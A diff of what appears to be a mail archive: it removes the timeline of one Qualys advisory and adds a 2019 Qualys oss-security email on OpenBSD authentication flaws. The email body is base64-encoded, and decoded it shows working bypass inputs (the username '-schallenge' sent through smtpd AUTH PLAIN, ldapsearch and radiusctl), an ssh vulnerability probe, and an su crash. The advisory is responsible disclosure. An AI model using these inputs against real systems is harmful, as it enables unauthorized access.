-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Timeline
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-2025-12-15: We sent a draft of our advisory and two proofs of concept
-(firefox_24.04.c and snap-store_25.10.c) to the Ubuntu Security Team.
-
-2026-03-12: The Ubuntu Security Team sent a patch, and we sent a draft
-of our advisory, to the linux-distros mailing list.
-
-2026-03-17: Coordinated Release Date (14:00 UTC).
+X-MS-Exchange-CrossTenant-userprincipalname: TDZZn1BPv4J3QnIJMEb8PubnVnLNqCycp1EM28cTwZMaf8yUj8UGYi3QAxrNnZOPW/uaWwOUErjW1MSR4RLaiKgJR3fXXMbmHeMXuh3QDL8=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: DM6PR06MB6009
+X-Proofpoint-SPF-Result: pass
+X-Proofpoint-SPF-Record: v=spf1 include:_spf.qualys.com include:spf.protection.outlook.com
+ include:spf-001ca501.pphosted.com include:stspg-customer.com
+ include:spf.salesforce.com include:sendgrid.net include:mktomail.com ~all
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.95,18.0.572
+ definitions=2019-12-04_03:2019-12-04,2019-12-04 signatures=0
+Date: Wed, 4 Dec 2019 20:49:22 +0000
+From: Qualys Security Advisory <qsa@qualys.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] Authentication vulnerabilities in OpenBSD
+To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
+
+DQpRdWFseXMgU2VjdXJpdHkgQWR2aXNvcnkNCg0KQXV0aGVudGljYXRpb24g
+dnVsbmVyYWJpbGl0aWVzIGluIE9wZW5CU0QNCg0KDQo9PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT0NCkNvbnRlbnRzDQo9PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT0NCg0KMS4gQ1ZFLTIwMTktMTk1MjE6IEF1
+dGhlbnRpY2F0aW9uIGJ5cGFzcw0KICAgMS4xLiBBbmFseXNpcw0KICAgMS4y
+LiBDYXNlIHN0dWR5OiBzbXRwZA0KICAgMS4zLiBDYXNlIHN0dWR5OiBsZGFw
+ZA0KICAgMS40LiBDYXNlIHN0dWR5OiByYWRpdXNkDQogICAxLjUuIENhc2Ug
+c3R1ZHk6IHNzaGQNCiAgIDEuNi4gQ2FzZSBzdHVkeTogc3UNCjIuIENWRS0y
+MDE5LTE5NTIwOiBMb2NhbCBwcml2aWxlZ2UgZXNjYWxhdGlvbiB2aWEgeGxv
+Y2sNCjMuIENWRS0yMDE5LTE5NTIyOiBMb2NhbCBwcml2aWxlZ2UgZXNjYWxh
+dGlvbiB2aWEgUy9LZXkgYW5kIFl1YmlLZXkNCjQuIENWRS0yMDE5LTE5NTE5
+OiBMb2NhbCBwcml2aWxlZ2UgZXNjYWxhdGlvbiB2aWEgc3UNCjUuIEFja25v
+d2xlZGdtZW50cw0KDQoNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PQ0KMS4gQ1ZFLTIwMTktMTk1MjE6IEF1dGhlbnRpY2F0aW9uIGJ5cGFz
+cw0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCldlIGRp
+c2NvdmVyZWQgYW4gYXV0aGVudGljYXRpb24tYnlwYXNzIHZ1bG5lcmFiaWxp
+dHkgaW4gT3BlbkJTRCdzDQphdXRoZW50aWNhdGlvbiBzeXN0ZW06IHRoaXMg
+dnVsbmVyYWJpbGl0eSBpcyByZW1vdGVseSBleHBsb2l0YWJsZSBpbg0Kc210
+cGQsIGxkYXBkLCBhbmQgcmFkaXVzZCwgYnV0IGl0cyByZWFsLXdvcmxkIGlt
+cGFjdCBzaG91bGQgYmUgc3R1ZGllZA0Kb24gYSBjYXNlLWJ5LWNhc2UgYmFz
+aXMuIEZvciBleGFtcGxlLCBzc2hkIGlzIG5vdCBleHBsb2l0YWJsZSB0aGFu
+a3MgdG8NCml0cyBkZWZlbnNlLWluLWRlcHRoIG1lY2hhbmlzbXMuDQoNCg0K
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoxLjEuIEFuYWx5
+c2lzDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KRnJv
+bSB0aGUgbWFudWFsIHBhZ2Ugb2YgbG9naW4uY29uZjoNCg0KLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogICAgIE9wZW5CU0QgdXNlcyBC
+U0QgQXV0aGVudGljYXRpb24sIHdoaWNoIGlzIG1hZGUgdXAgb2YgYSB2YXJp
+ZXR5IG9mDQogICAgIGF1dGhlbnRpY2F0aW9uIHN0eWxlcy4gIFRoZSBhdXRo
+ZW50aWNhdGlvbiBzdHlsZXMgY3VycmVudGx5IHByb3ZpZGVkIGFyZToNCiAg
+ICAgLi4uDQogICAgIHBhc3N3ZCAgICAgUmVxdWVzdCBhIHBhc3N3b3JkIGFu
+ZCBjaGVjayBpdCBhZ2FpbnN0IHRoZSBwYXNzd29yZCBpbiB0aGUNCiAgICAg
+ICAgICAgICAgICBtYXN0ZXIucGFzc3dkIGZpbGUuICBTZWUgbG9naW5fcGFz
+c3dkKDgpLg0KICAgICAuLi4NCiAgICAgc2tleSAgICAgICBTZW5kIGEgY2hh
+bGxlbmdlIGFuZCByZXF1ZXN0IGEgcmVzcG9uc2UsIGNoZWNraW5nIGl0IHdp
+dGgNCiAgICAgICAgICAgICAgICBTL0tleSAodG0pIGF1dGhlbnRpY2F0aW9u
+LiAgU2VlIGxvZ2luX3NrZXkoOCkuDQogICAgIC4uLg0KICAgICB5dWJpa2V5
+ICAgIEF1dGhlbnRpY2F0ZSB1c2luZyBhIFl1YmljbyBZdWJpS2V5IHRva2Vu
+LiAgU2VlDQogICAgICAgICAgICAgICAgbG9naW5feXViaWtleSg4KS4NCiAg
+ICAgLi4uDQogICAgIEZvciBhbnkgZ2l2ZW4gc3R5bGUsIHRoZSBwcm9ncmFt
+IC91c3IvbGliZXhlYy9hdXRoL2xvZ2luX3N0eWxlIGlzIHVzZWQgdG8NCiAg
+ICAgcGVyZm9ybSB0aGUgYXV0aGVudGljYXRpb24uICBUaGUgc3lub3BzaXMg
+b2YgdGhpcyBwcm9ncmFtIGlzOg0KDQogICAgIC91c3IvbGliZXhlYy9hdXRo
+L2xvZ2luX3N0eWxlIFstdiBuYW1lPXZhbHVlXSBbLXMgc2VydmljZV0gdXNl
+cm5hbWUgY2xhc3MNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LQ0KDQpUaGlzIGlzIHRoZSBmaXJzdCBwaWVjZSBvZiB0aGUgcHV6emxlOiBp
+ZiBhbiBhdHRhY2tlciBzcGVjaWZpZXMgYQ0KdXNlcm5hbWUgb2YgdGhlIGZv
+cm0gIi1vcHRpb24iLCB0aGV5IGNhbiBpbmZsdWVuY2UgdGhlIGJlaGF2aW9y
+IG9mIHRoZQ0KYXV0aGVudGljYXRpb24gcHJvZ3JhbSBpbiB1bmV4cGVjdGVk
+IHdheXMuDQoNCkZyb20gdGhlIG1hbnVhbCBwYWdlIG9mIGxvZ2luX3Bhc3N3
+ZDoNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogICAg
+IGxvZ2luX3Bhc3N3ZCBbLXMgc2VydmljZV0gWy12IHdoZWVsPXllc3xub10g
+Wy12IGxhc3RjaGFuY2U9eWVzfG5vXSB1c2VyDQogICAgICAgICAgICAgICAg
+ICBbY2xhc3NdDQogICAgIC4uLg0KICAgICBUaGUgc2VydmljZSBhcmd1bWVu
+dCBzcGVjaWZpZXMgd2hpY2ggcHJvdG9jb2wgdG8gdXNlIHdpdGggdGhlIGlu
+dm9raW5nDQogICAgIHByb2dyYW0uICBUaGUgYWxsb3dlZCBwcm90b2NvbHMg
+YXJlIGxvZ2luLCBjaGFsbGVuZ2UsIGFuZCByZXNwb25zZS4gIChUaGUNCiAg
+ICAgY2hhbGxlbmdlIHByb3RvY29sIGlzIHNpbGVudGx5IGlnbm9yZWQgYnV0
+IHdpbGwgcmVwb3J0IHN1Y2Nlc3MgYXMgcGFzc3dkLQ0KICAgICBzdHlsZSBh
+dXRoZW50aWNhdGlvbiBpcyBub3QgY2hhbGxlbmdlLXJlc3BvbnNlIGJhc2Vk
+KS4NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpUaGlz
+IGlzIHRoZSBzZWNvbmQgcGllY2Ugb2YgdGhlIHB1enpsZTogaWYgYW4gYXR0
+YWNrZXIgc3BlY2lmaWVzIHRoZQ0KdXNlcm5hbWUgIi1zY2hhbGxlbmdlIiAo
+b3IgIi1zY2hhbGxlbmdlOnBhc3N3ZCIgdG8gZm9yY2UgYSBwYXNzd2Qtc3R5
+bGUNCmF1dGhlbnRpY2F0aW9uKSwgdGhlbiB0aGUgYXV0aGVudGljYXRpb24g
+aXMgYXV0b21hdGljYWxseSBzdWNjZXNzZnVsIGFuZA0KdGhlcmVmb3JlIGJ5
+cGFzc2VkLg0KDQoNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PQ0KMS4yLiBDYXNlIHN0dWR5OiBzbXRwZA0KPT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09DQoNClRvIGRlbW9uc3RyYXRlIGhvdyBzbXRwZCdz
+IGF1dGhlbnRpY2F0aW9uIGNhbiBiZSBieXBhc3NlZCwgd2UgZm9sbG93IHRo
+ZQ0KaW5zdHJ1Y3Rpb25zIGZyb20gdGhlIG1hbnVhbCBwYWdlIG9mIHNtdHBk
+LmNvbmY6DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0K
+ICAgICBJbiB0aGlzIHNlY29uZCBleGFtcGxlLCB0aGUgYWltIGlzIHRvIHBl
+cm1pdCBtYWlsIGRlbGl2ZXJ5IGFuZCByZWxheWluZw0KICAgICBvbmx5IGZv
+ciB1c2VycyB0aGF0IGNhbiBhdXRoZW50aWNhdGUgKHVzaW5nIHRoZWlyIG5v
+cm1hbCBsb2dpbg0KICAgICBjcmVkZW50aWFscykuDQogICAgICAgICAgIC4u
+Lg0KICAgICAgICAgICBsaXN0ZW4gb24gZWdyZXNzIHRscyBwa2kgbWFpbC5l
+eGFtcGxlLmNvbSBhdXRoDQogICAgICAgICAgIC4uLg0KICAgICAgICAgICBt
+YXRjaCBhdXRoIGZyb20gYW55IGZvciBhbnkgYWN0aW9uICJvdXRib3VuZCIN
+Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQphbmQgd2Ug
+cmVzdGFydCBzbXRwZC4gVGhlbiwgd2l0aCBvdXIgcmVtb3RlLWF0dGFja2Vy
+IGhhdCBvbjoNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+DQokIHByaW50ZiAnXDAtc2NoYWxsZW5nZVwwd2hhdGV2ZXInIHwgb3BlbnNz
+bCBiYXNlNjQNCkFDMXpZMmhoYkd4bGJtZGxBSGRvWVhSbGRtVnkNCg0KJCBv
+cGVuc3NsIHNfY2xpZW50IC1jb25uZWN0IDE5Mi4xNjguNTYuMTIxOjI1IC1z
+dGFydHRscyBzbXRwDQouLi4NCkVITE8gY2xpZW50LmV4YW1wbGUuY29tDQou
+Li4NCkFVVEggUExBSU4gQUMxelkyaGhiR3hsYm1kbEFIZG9ZWFJsZG1WeQ0K
+MjM1IDIuMC4wIEF1dGhlbnRpY2F0aW9uIHN1Y2NlZWRlZA0KLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCg0KPT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09DQoxLjMuIENhc2Ugc3R1ZHk6IGxkYXBkDQo9
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KRnJvbSB0aGUg
+bWFudWFsIHBhZ2Ugb2YgbGRhcGQ6DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLQ0KICAgICBsZGFwZCBjYW4gYXV0aGVudGljYXRlIHVz
+ZXJzIHZpYSBzaW1wbGUgYmluZHMgb3IgU0FTTCB3aXRoIHRoZSBQTEFJTg0K
+ICAgICBtZWNoYW5pc20uDQogICAgIC4uLg0KICAgICBXaGVuIHVzaW5nIFNB
+U0wgYmluZHMsIHRoZSBhdXRoZW50aWNhdGlvbiBJRCBzaG91bGQgYmUgYSB2
+YWxpZCB1c2VybmFtZQ0KICAgICBmb3IgQlNEIEF1dGhlbnRpY2F0aW9uLg0K
+DQogICAgIEZvciBwbGFpbiB0ZXh0IHBhc3N3b3JkcyB0byBiZSBhY2NlcHRl
+ZCwgdGhlIGNvbm5lY3Rpb24gbXVzdCBiZQ0KICAgICBjb25zaWRlcmVkIHNl
+Y3VyZSwgZWl0aGVyIGJ5IHVzaW5nIGFuIGVuY3J5cHRlZCBjb25uZWN0aW9u
+LCBvciBieSB1c2luZw0KICAgICB0aGUgc2VjdXJlIGtleXdvcmQgaW4gdGhl
+IGNvbmZpZ3VyYXRpb24gZmlsZS4NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLQ0KDQpPdmVyIHN1Y2ggYSBzZWN1cmUgY29ubmVjdGlvbiwg
+YSByZW1vdGUgYXR0YWNrZXIgY2FuIGJ5cGFzcyBsZGFwZCdzIFNBU0wNCmF1
+dGhlbnRpY2F0aW9uOg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0NCiQgbGRhcHNlYXJjaCAtSCBsZGFwOi8vMTkyLjE2OC41Ni4xMjEg
+LU8gbm9uZSAtVSBpbnZhbGlkdXNlciAtdyB3aGF0ZXZlcg0KU0FTTC9QTEFJ
+TiBhdXRoZW50aWNhdGlvbiBzdGFydGVkDQpsZGFwX3Nhc2xfaW50ZXJhY3Rp
+dmVfYmluZF9zOiBJbnZhbGlkIGNyZWRlbnRpYWxzICg0OSkNCg0KJCBsZGFw
+c2VhcmNoIC1IIGxkYXA6Ly8xOTIuMTY4LjU2LjEyMSAtTyBub25lIC1VIC1z
+Y2hhbGxlbmdlIC13IHdoYXRldmVyDQpTQVNML1BMQUlOIGF1dGhlbnRpY2F0
+aW9uIHN0YXJ0ZWQNClNBU0wgdXNlcm5hbWU6IC1zY2hhbGxlbmdlDQouLi4N
+CiMgbnVtUmVzcG9uc2VzOiAxDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0NCg0KDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT0NCjEuNC4gQ2FzZSBzdHVkeTogcmFkaXVzZA0KPT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09DQoNClRvIHNob3cgaG93IHJhZGl1c2QncyBh
+dXRoZW50aWNhdGlvbiBjYW4gYmUgYnlwYXNzZWQsIHdlIGFkYXB0IHRoZQ0K
+Y29uZmlndXJhdGlvbiBleGFtcGxlIGZyb20gdGhlIG1hbnVhbCBwYWdlIG9m
+IHJhZGl1c2QuY29uZjoNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tDQogICAgICAgICAgIG1vZHVsZSBsb2FkICJic2RhdXRoIiAiL3Vz
+ci9saWJleGVjL3JhZGl1c2QvcmFkaXVzZF9ic2RhdXRoIg0KICAgICAgICAg
+ICAuLi4NCiAgICAgICAgICAgYXV0aGVudGljYXRlICogew0KICAgICAgICAg
+ICAgICAgICAgIGF1dGhlbnRpY2F0ZS1ieSAiYnNkYXV0aCINCiAgICAgICAg
+ICAgfQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCmFu
+ZCB3ZSBzZW5kIHRoZSBmb2xsb3dpbmcgKHN1Y2Nlc3NmdWwpIGF1dGhlbnRp
+Y2F0aW9uIHJlcXVlc3Q6DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLQ0KJCByYWRpdXNjdGwgdGVzdCAxOTIuMTY4LjU2LjEyMSBzZWNy
+ZXQgLXNjaGFsbGVuZ2UgcGFzc3dvcmQgd2hhdGV2ZXINCiAgICAuLi4NCiAg
+ICBSZXBseS1NZXNzYWdlICAgICAgICAgICAgID0gIkF1dGhlbnRpY2F0aW9u
+IHN1Y2NlZWRlZCINCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LQ0KDQpJZiB3ZSBmdXJ0aGVyIG1vZGlmeSByYWRpdXNkJ3MgY29uZmlndXJh
+dGlvbiB0byByZXN0cmljdCBhY2Nlc3MgdG8gdGhlDQptZW1iZXJzIG9mIHRo
+ZSBncm91cCAib3BlcmF0b3IiOg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0NCiAgICAgICAgICAgbW9kdWxlIHNldCAiYnNkYXV0aCIg
+ICJyZXN0cmljdC1ncm91cCIgIm9wZXJhdG9yIg0KLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tDQoNCmFuZCBzZW5kIG91ciBhdXRoZW50aWNh
+dGlvbiByZXF1ZXN0LCB0aGVuIHJhZGl1c2RfYnNkYXV0aCBjcmFzaGVzDQpi
+ZWNhdXNlIG9mIGEgTlVMTC1wb2ludGVyIGRlcmVmZXJlbmNlIChiZWNhdXNl
+IGdldHB3bmFtKCItc2NoYWxsZW5nZSIpDQpyZXR1cm5zIE5VTEwpOg0KDQot
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiA4MCBpbnQNCiA4
+MSBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQogODIgew0KLi4uDQox
+OTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdyA9IGdldHB3
+bmFtKHVzZXIpOw0KLi4uDQoxOTcgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICBpZiAoZ3ItPmdyX2dpZCA9PSBwdy0+cHdfZ2lkKSB7DQotLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KDQo9PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT0NCjEuNS4gQ2FzZSBzdHVkeTogc3No
+ZA0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCkV2ZW4g
+aWYgYW4gYXR0YWNrZXIgd2VyZSBhYmxlIHRvIGJ5cGFzcyBzc2hkJ3MgYXV0
+aGVudGljYXRpb24gd2l0aCBhbg0KaW52YWxpZCB1c2VyIHN1Y2ggYXMgIi1z
+Y2hhbGxlbmdlIiwgc3NoZCB3b3VsZCBldmVudHVhbGx5IHJlamVjdCBpdDoN
+Cg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogMjI1IHZv
+aWQNCiAyMjYgbW9uaXRvcl9jaGlsZF9wcmVhdXRoKHN0cnVjdCBzc2ggKnNz
+aCwgc3RydWN0IG1vbml0b3IgKnBtb25pdG9yKQ0KIDIyNyB7DQogLi4uDQog
+MjI5ICAgICAgICAgaW50IGF1dGhlbnRpY2F0ZWQgPSAwLCBwYXJ0aWFsID0g
+MDsNCiAuLi4NCiAyNDkgICAgICAgICB3aGlsZSAoIWF1dGhlbnRpY2F0ZWQp
+IHsNCiAuLi4NCiAyODggICAgICAgICB9DQogMjg5DQogMjkwICAgICAgICAg
+aWYgKCFhdXRoY3R4dC0+dmFsaWQpDQogMjkxICAgICAgICAgICAgICAgICBm
+YXRhbCgiJXM6IGF1dGhlbnRpY2F0ZWQgaW52YWxpZCB1c2VyIiwgX19mdW5j
+X18pOw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCk5l
+dmVydGhlbGVzcywgd2UgY2FuIHVzZSBzc2hkIHRvIHJlbW90ZWx5IHRlc3Qg
+d2hldGhlciBhbiBPcGVuQlNEIHN5c3RlbQ0KaXMgdnVsbmVyYWJsZSB0byBD
+VkUtMjAxOS0xOTUyMSBvciBub3Q6DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLQ0KJCBzc2ggLXYgLUYgL2Rldi9udWxsIC1vIFByZWZl
+cnJlZEF1dGhlbnRpY2F0aW9ucz1rZXlib2FyZC1pbnRlcmFjdGl2ZSBcDQog
+ICAgICAtbyBLYmRJbnRlcmFjdGl2ZURldmljZXM9YnNkYXV0aCAtbCAtc3Jl
+c3BvbnNlOnBhc3N3ZCAxOTIuMTY4LjU2LjEyMQ0KLi4uDQpkZWJ1ZzE6IE5l
+eHQgYXV0aGVudGljYXRpb24gbWV0aG9kOiBrZXlib2FyZC1pbnRlcmFjdGl2
+ZQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkl0IGlz
+IHZ1bG5lcmFibGUgaWYgdGhlIGNvbm5lY3Rpb24gaGFuZ3MsIGJlY2F1c2Ug
+c3NoZCB3YWl0cyBmb3INCmxvZ2luX3Bhc3N3ZCB0byBzZW5kIGEgY2hhbGxl
+bmdlLCB3aGlsZSBsb2dpbl9wYXNzd2Qgd2FpdHMgZm9yIHNzaGQgdG8NCnNl
+bmQgYSByZXNwb25zZSAoYmVjYXVzZSBsb2dpbl9wYXNzd2QgaW50ZXJwcmV0
+cyB0aGUgdXNlcm5hbWUNCiItc3Jlc3BvbnNlIiBhcyBhbiBvcHRpb24pLg0K
+DQoNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KMS42LiBD
+YXNlIHN0dWR5OiBzdQ0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09DQoNCkEgbG9jYWwgYXR0YWNrZXIgY2FuIGJ5cGFzcyBzdSdzIGF1dGhl
+bnRpY2F0aW9uIGZvciB0aGUgaW52YWxpZCB1c2VyDQoiLXNjaGFsbGVuZ2Ui
+LCBidXQgc3UgZXZlbnR1YWxseSBjcmFzaGVzIGJlY2F1c2Ugb2YgYSBOVUxM
+LXBvaW50ZXINCmRlcmVmZXJlbmNlIChiZWNhdXNlIGdldHB3bmFtX3IoIi1z
+Y2hhbGxlbmdlIiwgLi4uKSByZXR1cm5zIE5VTEwpOg0KDQotLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiQgc3UgLUwgLS0gLXNjaGFsbGVu
+Z2UNClNlZ21lbnRhdGlvbiBmYXVsdA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tDQoNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09DQoyLiBDVkUtMjAxOS0xOTUyMDogTG9jYWwgcHJpdmlsZWdlIGVz
+Y2FsYXRpb24gdmlhIHhsb2NrDQo9PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT0NCg0KT24gT3BlbkJTRCwgL3Vzci9YMTFSNi9iaW4veGxvY2sg
+aXMgaW5zdGFsbGVkIGJ5IGRlZmF1bHQgYW5kIGlzDQpzZXQtZ3JvdXAtSUQg
+ImF1dGgiLCBub3Qgc2V0LXVzZXItSUQ7IHRoZSBmb2xsb3dpbmcgY2hlY2sg
+aXMgdGhlcmVmb3JlDQppbmNvbXBsZXRlIGFuZCBzaG91bGQgdXNlIGlzc2V0
+dWdpZCgpIGluc3RlYWQ6DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLQ0KMTAxIF9YX0hJRERFTiB2b2lkICoNCjEwMiBkcmlPcGVuRHJp
+dmVyKGNvbnN0IGNoYXIgKmRyaXZlck5hbWUpDQoxMDMgew0KLi4uDQoxMTMg
